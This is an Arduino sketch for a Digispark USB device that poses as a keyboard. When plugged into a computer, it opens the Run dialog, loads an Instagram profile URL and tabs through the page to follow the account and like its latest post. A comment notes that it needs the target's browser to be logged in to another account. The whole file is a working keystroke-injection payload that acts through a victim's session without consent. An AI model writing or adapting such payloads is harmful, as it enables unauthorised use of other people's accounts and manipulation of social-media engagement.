#include "DigiKeyboard.h"
void setup() {
  //empty

//Keanuaer: follow on insta and like latest post - reqirement:Target Browser logged in in other account.

}
void loop() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("https://www.instagram.com/YOURUSERNAME/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.write('\t');
  DigiKeyboard.write('\t');
  DigiKeyboard.write('\t');
  DigiKeyboard.write('\t');
  DigiKeyboard.write('\t');
  DigiKeyboard.write('\t');
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("https://www.instagram.com/YOURUSERNAME/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.write('\t');
DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
